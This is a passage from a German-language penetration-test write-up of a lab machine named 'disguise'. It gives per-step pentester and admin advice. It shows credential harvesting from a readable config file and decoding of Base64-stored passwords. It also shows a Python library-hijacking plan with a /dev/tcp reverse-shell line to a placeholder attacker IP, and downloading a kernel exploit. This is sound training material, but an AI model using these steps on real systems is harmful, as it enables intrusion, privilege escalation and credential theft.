            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2&gt;/dev/null` sucht im gesamten Dateisystem (`/`) nach regulären Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit bewirkt, dass die Datei mit den Rechten des Dateieigentümers (hier meist `root`) ausgeführt wird, unabhängig davon, wer sie startet. Die Option `-ls` zeigt detaillierte Informationen zu den gefundenen Dateien an. `2&gt;/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Zugriffsberechtigungen auf bestimmte Verzeichnisse).</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das Auffinden von SUID-Binaries ist ein Standardverfahren bei der Suche nach Privilegienerweiterungsvektoren. Die aufgelisteten Dateien sind größtenteils Standard-SUID-Programme unter Linux (`umount`, `mount`, `passwd`, `sudo`, `su` etc.), die normalerweise sicher sind, wenn sie aktuell gehalten werden. Es sind keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien auf den ersten Blick ersichtlich, die ein leichtes Ziel darstellen könnten.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Versionen dieser SUID-Binaries auf bekannte Schwachstellen, insbesondere wenn das System veraltet ist. `sudo -l` (wird später ausgeführt) ist ein wichtiger nächster Schritt, um zu sehen, welche Befehle der aktuelle Benutzer (`www-data`) mit `sudo` ausführen darf.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries auf das absolut Notwendige. Entfernen Sie das SUID-Bit von Programmen, die es nicht benötigen. Halten Sie alle Systempakete auf dem neuesten Stand, um bekannte Schwachstellen in SUID-Programmen zu vermeiden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">ls /home/</span></div>
                    <pre>
<span class="command">darksoul</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">ls -laH /home/darksoul/</span></div>
                    <pre>
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 <span class="command">.bash_history -> /dev/null</span>
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw-r--r-- 1 root     root      114 Apr  2 04:03 <span class="command">config.ini</span>
-rw-r--r-- 1 root     root       32 May  4 17:31 <span class="command">darkshopcount</span>
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 <span class="command">user.txt</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>`ls /home/`: Listet die Benutzerverzeichnisse in `/home/` auf. Es gibt einen Benutzer `darksoul`.</li>
                    <li>`ls -laH /home/darksoul/`: Listet den Inhalt des Home-Verzeichnisses von `darksoul` detailliert auf.
                        <ul>
                            <li>Die Option `-H` ist hier relevant, falls `.bash_history` ein symbolischer Link wäre, würde `ls` dem Link folgen. Hier zeigt es, dass `.bash_history` ein Symlink auf `/dev/null` ist, was bedeutet, dass die Bash-Historie für diesen Benutzer nicht gespeichert wird (ein Hinweis auf Sicherheitsbewusstsein oder eine Konfiguration, um Spuren zu verwischen).</li>
                            <li>Interessante Dateien sind `config.ini` (Eigentümer `root`), `darkshopcount` (Eigentümer `root`) und `user.txt` (Eigentümer `darksoul`, nur für ihn lesbar).</li>
                        </ul>
                    </li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Das Home-Verzeichnis von `darksoul` enthält potenziell interessante Dateien. `config.ini` im Besitz von `root` im Home-Verzeichnis eines anderen Benutzers ist ungewöhnlich. `user.txt` ist das wahrscheinliche Ziel für die User-Flag. Die Tatsache, dass `.bash_history` nach `/dev/null` linkt, ist für einen Pentester ein kleiner Rückschlag, da keine Befehlshistorie des Benutzers `darksoul` eingesehen werden kann.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Inhalt von `config.ini` und `darkshopcount` zu lesen, da `www-data` möglicherweise Leserechte hat, auch wenn `root` der Eigentümer ist (abhängig von den globalen Leseberechtigungen). `user.txt` wird wahrscheinlich erst nach Übernahme des `darksoul`-Accounts oder durch einen anderen Exploit lesbar sein.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Dateiberechtigungen und Eigentümer im System. Dateien im Besitz von `root` in Benutzer-Home-Verzeichnissen sollten einen klaren Zweck haben. Das Verlinken von `.bash_history` auf `/dev/null` kann die Forensik erschweren, ist aber eine legitime Konfiguration, wenn gewünscht.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">cat /home/darksoul/config.ini</span></div>
                    <pre>
[client]
user = <span class="command">dark_db_admin</span>
password = <span class="password">Str0ngPassw0d1***</span>
host = <span class="command">localhost</span>
database = <span class="command">dark_shop</span>
port = <span class="command">int(3306)</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/home/darksoul$ <span class="command">cat darkshopcount</span></div>
                    <pre>
users count:2
products count:71
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>`cat /home/darksoul/config.ini`: Der Benutzer `www-data` hat Leserechte auf die Datei `config.ini`. Diese Datei enthält Zugangsdaten für eine MySQL-Datenbank:
                        <ul>
                            <li>Benutzer: `dark_db_admin`</li>
                            <li>Passwort: `Str0ngPassw0d1***`</li>
                            <li>Host: `localhost`</li>
                            <li>Datenbank: `dark_shop`</li>
                            <li>Port: `3306`</li>
                        </ul>
                    </li>
                    <li>`cat darkshopcount`: Diese Datei enthält einfache Zählungen, vermutlich aus der `dark_shop`-Datenbank.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Kritischer Fund!** Das Auslesen von Datenbank-Zugangsdaten aus einer Konfigurationsdatei ist ein signifikanter Informationsgewinn. Diese Zugangsdaten (`dark_db_admin:Str0ngPassw0d1***`) ermöglichen potenziell direkten Zugriff auf die `dark_shop`-Datenbank. Auch wenn der Benutzer `www-data` bereits Zugriff auf die Anwendung hatte, die diese Datenbank nutzt, könnten die Datenbank-Zugangsdaten höhere Privilegien innerhalb der Datenbank selbst gewähren oder für andere Zwecke (z.B. Verbindung von einem anderen Host, falls der DB-Server extern erreichbar wäre) nützlich sein.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den gefundenen Zugangsdaten (`dark_db_admin:Str0ngPassw0d1***`) direkt mit der MySQL-Datenbank auf `localhost` zu verbinden (z.B. mit `mysql -u dark_db_admin -p'Str0ngPassw0d1***' -h localhost dark_shop`). Untersuchen Sie die Datenbankstruktur, Tabelleninhalte (insbesondere Benutzertabellen, Passwort-Hashes) und Benutzerberechtigungen.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartext-Passwörter in Konfigurationsdateien, die von niedrig privilegierten Benutzern (wie `www-data`) gelesen werden können. Beschränken Sie die Leserechte auf Konfigurationsdateien so weit wie möglich. Verwenden Sie Umgebungsvariablen oder sicherere Mechanismen zur Passwortverwaltung (z.B. HashiCorp Vault). Stellen Sie sicher, dass Datenbankbenutzer nur die minimal notwendigen Berechtigungen haben.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/home/darksoul$ <span class="command">sudo -l</span></div>
                    <pre>

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` listet die Befehle auf, die der aktuelle Benutzer (`www-data`) mit `sudo` (also mit Root-Rechten oder den Rechten eines anderen Benutzers) ausführen darf. Das System fragt nach dem Passwort für `www-data`.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Da `www-data` typischerweise kein Passwort für die interaktive Anmeldung hat (es ist ein Dienstkonto), kann diese Passwortabfrage nicht beantwortet werden. Dies bedeutet, dass `www-data` keine `sudo`-Rechte ohne Passwort hat. Es ist jedoch möglich, dass es spezifische `NOPASSWD`-Einträge für bestimmte Befehle gibt, die hier nicht angezeigt werden, weil zuerst das Passwort abgefragt wird. Ohne das Passwort für `www-data` zu kennen, kann `sudo -l` nicht erfolgreich ausgeführt werden, um die tatsächlichen Sudo-Berechtigungen zu ermitteln.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da das Passwort für `www-data` unbekannt ist, ist `sudo -l` hier nicht direkt nützlich. Die Suche nach Sudo-Regeln muss über andere Wege erfolgen, falls möglich (z.B. Auslesen der `/etc/sudoers`-Datei, wenn Leserechte bestehen, was für `www-data` unwahrscheinlich ist, oder durch Ausnutzung anderer Schwachstellen). Konzentrieren Sie sich auf andere PrivEsk-Vektoren.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudo`-Rechte nach dem Prinzip der geringsten Rechte. Dienstkonten wie `www-data` sollten idealerweise keine `sudo`-Rechte haben oder nur sehr spezifische, passwortlose (`NOPASSWD`) Rechte für absolut notwendige Befehle. Die `/etc/sudoers`-Datei sollte streng geschützt sein.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/home/darksoul$ <span class="command">ls -la /opt/</span></div>
                    <pre>
total 12
drwxr-xr-x  2 root root 4096 Apr  1 09:58 .
drwxr-xr-x 18 root root 4096 Mar 31 11:13 ..
-rw-r--r--  1 root root  870 Apr  1 09:56 <span class="command">query.py</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/home/darksoul$ <span class="command">cat /opt/query.py</span></div>
                    <pre>
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py &lt;configfile&gt;")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        <span class="command">conn = mysql.connector.connect(read_default_file=cnf)</span>
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>`ls -la /opt/`: Zeigt den Inhalt des Verzeichnisses `/opt`. Es enthält eine Datei namens `query.py`, die `root` gehört, aber von allen gelesen werden kann.</li>
                    <li>`cat /opt/query.py`: Zeigt den Inhalt des Python-Skripts `query.py`.
                        <ul>
                            <li>Das Skript importiert `mysql.connector` und `sys`.</li>
                            <li>Es erwartet einen Kommandozeilenparameter (einen Konfigurationsdateipfad).</li>
                            <li>Es verbindet sich mit einer MySQL-Datenbank unter Verwendung der angegebenen Konfigurationsdatei (`mysql.connector.connect(read_default_file=cnf)`).</li>
                            <li>Es führt zwei `SELECT COUNT(*)`-Abfragen auf den Tabellen `users` und `products` aus und gibt die Ergebnisse aus.</li>
                        </ul>
                    </li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Das Skript `query.py` ist an sich nicht schädlich. Interessant ist jedoch, dass es `mysql.connector` importiert und eine Konfigurationsdatei verwendet, die als Argument übergeben wird. Wenn dieses Skript von einem höher privilegierten Benutzer (z.B. `root` in einem Cronjob) ausgeführt wird und der `PYTHONPATH` manipuliert werden kann oder eine der importierten Bibliotheken (wie `mysql.connector`) in einem vom `www-data`-Benutzer beschreibbaren Pfad liegt, könnte dies ein Vektor für Python Library Hijacking sein. Die Konfigurationsdatei `/home/darksoul/config.ini` (die zuvor gefunden wurde) wird wahrscheinlich mit diesem Skript verwendet.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie, ob und wie dieses Skript auf dem System ausgeführt wird (z.B. durch Cronjobs, wie später mit `pspy64` entdeckt). Wenn es als `root` läuft und der `PYTHONPATH` oder die Modulsuchpfade manipulierbar sind, könnte eine bösartige Version von `mysql.connector` oder einer anderen importierten Bibliothek in einem Pfad platziert werden, den Python zuerst durchsucht (z.B. `/tmp/`, wenn `PYTHONPATH=/tmp` gesetzt werden kann), um Code als `root` auszuführen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte, die mit erhöhten Rechten laufen (insbesondere als `root`), keine relativen Pfade für Importe verwenden und dass ihre Umgebung (wie `PYTHONPATH`) nicht von niedrig privilegierten Benutzern manipuliert werden kann. Führen Sie Skripte immer mit den geringstmöglichen Rechten aus. Verwenden Sie absolute Pfade für kritische Importe oder stellen Sie sicher, dass die Standard-Systembibliotheken immer Vorrang haben.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/home/darksoul$ <span class="command">mysql -u dark_db_admin -p'Str0ngPassw0d1***' -D dark_shop</span></div>
                    <pre>
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 115196
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

<span class="prompt">MariaDB [dark_shop]&gt; </span><span class="command">SHOW TABLES;</span>
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| <span class="command">products</span>            |
| <span class="command">users</span>               |
+---------------------+
2 rows in set (0.000 sec)

<span class="prompt">MariaDB [dark_shop]&gt; </span><span class="command">SELECT * FROM users;</span>
+----+-------------+--------------------------+---------+---------------------+
| id | username    | password                 | isAdmin | created_at          |
+----+-------------+--------------------------+---------+---------------------+
|  1 | <span class="command">simpleAdmin</span> | <span class="password">U3RyMG5nUGFzc3cwZDFAQEA=</span> |       1 | 2025-04-01 04:33:22 |
| 29 | <span class="command">hacker</span>      | <span class="password">YmVuaGFja2Vy</span>             |       0 | 2025-05-02 17:38:43 |
+----+-------------+--------------------------+---------+---------------------+
2 rows in set (0.000 sec)

<span class="prompt">MariaDB [dark_shop]&gt; </span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Der `www-data`-Benutzer verbindet sich mit der MySQL-Datenbank `dark_shop` unter Verwendung der zuvor in `config.ini` gefundenen Zugangsdaten (`dark_db_admin:Str0ngPassw0d1***`).
                <ul>
                    <li>`SHOW TABLES;`: Listet die Tabellen in der Datenbank auf: `products` und `users`.</li>
                    <li>`SELECT * FROM users;`: Gibt alle Einträge aus der Tabelle `users` aus.
                        <ul>
                            <li>Benutzer `simpleAdmin` (ID 1, isAdmin=1) mit dem Passwort-String `U3RyMG5nUGFzc3cwZDFAQEA=`.</li>
                            <li>Benutzer `hacker` (ID 29, isAdmin=0) mit dem Passwort-String `YmVuaGFja2Vy`.</li>
                        </ul>
                    </li>
                </ul>
                Die Passwort-Strings sehen Base64-kodiert aus.
                <ul>
                    <li>`U3RyMG5nUGFzc3cwZDFAQEA=` dekodiert zu `Str0ngPassw0d1@@@` (das bereits für `simpleAdmin` auf `dark.disguise.hmv` geknackte Passwort).</li>
                    <li>`YmVuaGFja2Vy` dekodiert zu `benhacker`.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der direkte Datenbankzugriff bestätigt die Benutzer und ihre Passwörter (in kodierter Form). Die Tatsache, dass Passwörter scheinbar nur Base64-kodiert und nicht gehasht in der Datenbank gespeichert werden, ist eine erhebliche Sicherheitslücke. Der Benutzer "hacker" mit dem Passwort "benhacker" ist ein neuer Fund. Es ist unklar, ob dieser Benutzer für den Login auf `dark.disguise.hmv` verwendet werden kann oder nur ein Datenbankeintrag ist.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den Zugangsdaten `hacker:benhacker` auf `http://dark.disguise.hmv/login.php` anzumelden. Obwohl `isAdmin=0` ist, könnte dieser Account andere Berechtigungen oder Zugriff auf andere Funktionen haben. Überprüfen Sie die Berechtigungen des Datenbankbenutzers `dark_db_admin` innerhalb der Datenbank (z.B. `SHOW GRANTS FOR 'dark_db_admin'@'localhost';`).<br><strong>Empfehlung (Admin):</strong> **Speichern Sie Passwörter in der Datenbank niemals als Base64-kodierte Strings!** Verwenden Sie starke, gesalzene Hashing-Algorithmen (z.B. Argon2, scrypt, bcrypt, oder zumindest SHA-256/512 mit Salt). Überprüfen Sie alle Benutzerkonten und deren Berechtigungen. Der Account "hacker" sollte untersucht und ggf. entfernt werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">systemctl list-timers --all</span></div>
                    <pre>
NEXT                         LEFT          LAST                         PASSED   UNIT                         ACTIVATES
Sun 2025-05-04 18:09:00 EDT  22min left    Sun 2025-05-04 17:39:01 EDT  7min ago   <span class="command">phpsessionclean.timer</span>        phpsessionclean.service
Sun 2025-05-04 20:32:56 EDT  2h 46min left Sun 2025-05-04 09:45:23 EDT  8h ago   <span class="command">apt-daily.timer</span>              apt-daily.service
Mon 2025-05-05 00:00:00 EDT  6h left       Sun 2025-05-04 09:45:23 EDT  8h ago   <span class="command">logrotate.timer</span>              logrotate.service
Mon 2025-05-05 00:00:00 EDT  6h left       Sun 2025-05-04 09:45:23 EDT  8h ago   <span class="command">man-db.timer</span>                 man-db.service
Mon 2025-05-05 06:23:48 EDT  12h left      Sun 2025-05-04 09:45:23 EDT  8h ago   <span class="command">apt-daily-upgrade.timer</span>      apt-daily-upgrade.service
Mon 2025-05-05 10:00:55 EDT  16h left      Sun 2025-05-04 10:00:55 EDT  7h ago   <span class="command">systemd-tmpfiles-clean.timer</span> systemd-tmpfiles-clean.service

6 timers listed.
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">systemctl cat query-darkshop.service</span></div>
                    <pre>
<span class="password">No files found for query-darkshop.service.</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">crontab -u root -l</span></div>
                    <pre>
<span class="password">must be privileged to use -u</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">ps aux | grep python</span></div>
                    <pre>
www-data  4444  0.0  0.2  15636  8916 ?        S    17:40   0:00 <span class="command">python3 -c import pty;pty.spawn("/bin/bash")</span>
www-data  4511  0.0  0.0   6272   876 pts/1    S+   17:48   0:00 grep python
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Befehle dienen der Suche nach geplanten Aufgaben (Cronjobs oder systemd Timers), die für eine Privilegienerweiterung missbraucht werden könnten.
                <ul>
                    <li>`systemctl list-timers --all`: Listet alle aktiven und inaktiven systemd Timer auf. Es werden Standard-System-Timer angezeigt (`phpsessionclean`, `apt-daily`, `logrotate` etc.). Keiner davon scheint direkt für einen Exploit durch `www-data` missbrauchbar zu sein.</li>
                    <li>`systemctl cat query-darkshop.service`: Versucht, den Inhalt einer systemd Service Unit namens `query-darkshop.service` anzuzeigen. Die Meldung "No files found" bedeutet, dass ein solcher Service nicht existiert.</li>
                    <li>`crontab -u root -l`: Versucht, die Crontab-Einträge des Root-Benutzers aufzulisten. Dies schlägt fehl ("must be privileged to use -u"), da `www-data` nicht die notwendigen Rechte hat.</li>
                    <li>`ps aux | grep python`: Listet laufende Prozesse auf und filtert nach "python". Es wird die eigene Reverse Shell (`python3 -c import pty...`) angezeigt, aber keine anderen auffälligen Python-Prozesse, die von `root` oder anderen Benutzern periodisch gestartet werden.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Standardmethoden zur Enumeration von Cronjobs (`crontab -l`) und systemd Services (`systemctl cat`) liefern hier keine direkten Hinweise auf einen privilegierten, periodisch ausgeführten Task, der das Skript `/opt/query.py` verwendet. Die `ps aux`-Ausgabe ist auch unauffällig bezüglich periodischer Python-Skripte.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die direkten Abfragen fehlschlagen, ist ein Tool wie `pspy` (das später verwendet wird) notwendig, um Prozesse in Echtzeit zu überwachen und so auch kurzlebige Cronjobs oder durch andere Mechanismen gestartete Prozesse zu entdecken, die von Root ausgeführt werden und potenziell manipulierbar sind.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf `systemctl` und `crontab` auf berechtigte Benutzer. Überwachen Sie die Erstellung und Änderung von Cronjobs und systemd Units. Führen Sie geplante Aufgaben immer mit den geringstmöglichen Rechten aus.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[~/Hackingtools]
└─# <span class="command">python3 -m http.server 8000</span></div>
                    <pre>
<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">wget 192.168.2.199:8000/pspy64</span></div>
                    <pre>
--2025-05-04 17:49:36--  http://192.168.2.199:8000/pspy64
Connecting to 192.168.2.199:8000... <span class="password">connected.</span>
HTTP request sent, awaiting response... <span class="password">200 OK</span>
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                          100%[=====================================================================================================&gt;]   2.94M  --.-KB/s    in 0.1s    

2025-05-04 17:49:36 (28.1 MB/s) - <span class="password">‘pspy64’ saved [3078592/3078592]</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">chmod +x pspy64</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">./pspy64</span></div>
                    <pre>
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
[...]
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/05/04 17:49:58 CMD: UID=33   PID=4519   | ./pspy64 
[...]
<span class="password">2025/05/04 17:50:01 CMD: UID=0    PID=4530   | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini &gt; /home/darksoul/darkshopcount</span> 
<span class="password">2025/05/04 17:50:01 CMD: UID=0    PID=4531   | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini</span> 
<span class="password">2025/05/04 17:50:01 CMD: UID=0    PID=4532   | /bin/sh -c uname -p 2&gt; /dev/null</span> 
[...]
<span class="password">^C</span>Exiting program... (interrupt)
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Schrittfolge zeigt den Transfer und die Ausführung von `pspy64`, einem Tool zur Überwachung von Prozessen ohne Root-Rechte, um versteckte Cronjobs oder andere periodisch ausgeführte Prozesse zu finden.
                <ol>
                    <li>Auf dem Angreifer-Rechner wird mit `python3 -m http.server 8000` ein einfacher HTTP-Server gestartet, um Dateien bereitzustellen.</li>
                    <li>Auf dem Zielserver (`disguise`) lädt der `www-data`-Benutzer die Datei `pspy64` vom Angreifer-Server via `wget` in das `/tmp`-Verzeichnis herunter.</li>
                    <li>`chmod +x pspy64` macht die heruntergeladene Datei ausführbar.</li>
                    <li>`./pspy64` startet das Tool. `pspy` lauscht auf Prozessereignisse.</li>
                </ol>
                **Entscheidender Fund durch `pspy64`:**
                `pspy` zeigt, dass periodisch (hier um 17:50:01) Befehle als `UID=0` (Root) ausgeführt werden:
                <ul>
                    <li><code>/bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini &gt; /home/darksoul/darkshopcount</code></li>
                    <li><code>/usr/bin/python3 /opt/query.py /home/darksoul/config.ini</code></li>
                </ul>
                Dies bestätigt, dass das Skript `/opt/query.py` tatsächlich von `root` über einen Cronjob (oder einen ähnlichen Mechanismus) ausgeführt wird und die Konfigurationsdatei `/home/darksoul/config.ini` verwendet.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Hervorragend! Dies ist der Schlüssel zur Privilegienerweiterung!** `pspy` hat den versteckten Cronjob aufgedeckt, der das Python-Skript `/opt/query.py` als Root ausführt. Da dieses Skript `mysql.connector` importiert und der `www-data`-Benutzer potenziell den `PYTHONPATH` beeinflussen oder eine eigene Version von `mysql.connector` in einem beschreibbaren, früh im Suchpfad liegenden Verzeichnis (wie `/tmp`) platzieren kann, öffnet dies die Tür für Python Library Hijacking.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diesen Cronjob für Python Library Hijacking:
                <ol>
                    <li>Setzen Sie `export PYTHONPATH=/tmp` (oder ein anderes beschreibbares Verzeichnis, das im `sys.path` von Python vor den Standardbibliotheken erscheint, wenn das Skript als Root ausgeführt wird).</li>
                    <li>Erstellen Sie in `/tmp` die Verzeichnisstruktur `mysql/` und darin eine Datei `connector.py`.</li>
                    <li>In `/tmp/mysql/connector.py` fügen Sie Python-Code ein, der eine Reverse Shell startet oder einen anderen bösartigen Befehl als Root ausführt (z.B. `os.system("bash -c 'bash -i >& /dev/tcp/ANGREIFER_IP/NEUER_PORT 0>&1'")`).</li>
                    <li>Starten Sie einen Listener auf `ANGREIFER_IP:NEUER_PORT`.</li>
                    <li>Warten Sie, bis der Cronjob das nächste Mal ausgeführt wird. Ihre bösartige `connector.py` sollte geladen werden und Ihnen eine Root-Shell geben.</li>
                </ol>
            <br><strong>Empfehlung (Admin):</strong> **Überprüfen Sie diesen Cronjob sofort!** Stellen Sie sicher, dass von Root ausgeführte Skripte keine relativen Pfade für Importe verwenden und ihre Umgebung (insbesondere `PYTHONPATH`) nicht von niedrig privilegierten Benutzern manipuliert werden kann. Wenn möglich, führen Sie das Skript mit einem dedizierten, unprivilegierten Benutzer aus, der nur die notwendigen Rechte hat. Überwachen Sie die Integrität von Systembibliotheken und häufig genutzten Skripten.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</span></div>
                    <pre>
--2025-05-05 00:21:15--  https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
Auflösen des Hostnamens raw.githubusercontent.com (raw.githubusercontent.com)… 2606:50c0:8001::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Verbindungsaufbau zu raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8001::154|:443 … <span class="password">verbunden.</span>
HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
Länge: 16031 (16K) [text/plain]
Wird in »poc.c« gespeichert.

poc.c                                           100%[=====================================================================================================&gt;]  15,66K  --.-KB/s    in 0,001s  

2025-05-05 00:21:15 (26,3 MB/s) - <span class="password">»poc.c« gespeichert [16031/16031]</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(pwn)─(root㉿cyber)-[~/Hackingtools]
└─# <span class="command">gcc poc.c -o exploit</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">wget 192.168.2.199:8000/exploit</span></div>
                    <pre>
--2025-05-04 18:21:50--  http://192.168.2.199:8000/exploit
Connecting to 192.168.2.199:8000... <span class="password">connected.</span>
HTTP request sent, awaiting response... <span class="password">200 OK</span>
Length: 31312 (31K) [application/octet-stream]
Saving to: ‘exploit’

exploit                                         100%[=====================================================================================================&gt;]  30.58K  --.-KB/s    in 0s      

2025-05-04 18:21:50 (304 MB/s) - <span class="password">‘exploit’ saved [31312/31312]</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">chmod +x exploit</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">./exploit</span></div>
                    <pre>
<span class="password">./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./exploit)</span>
<span class="password">./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> In dieser Sequenz wird versucht, einen Kernel-Exploit (CVE-2019-13272) auf das Zielsystem zu bringen und auszuführen.
                <ol>
                    <li>Der Quellcode (`poc.c`) für den Exploit wird von GitHub heruntergeladen (dies geschieht hier scheinbar auf dem Angreifer-Rechner, da der Prompt `┌──(pwn)─(root㉿cyber)-[~/Hackingtools]` ist, aber der `wget` dann in der `www-data` Shell ausgeführt wird - das Log ist hier etwas inkonsistent. Angenommen wird, der Download des Quellcodes geschieht auf der Angreifer-Maschine).</li>
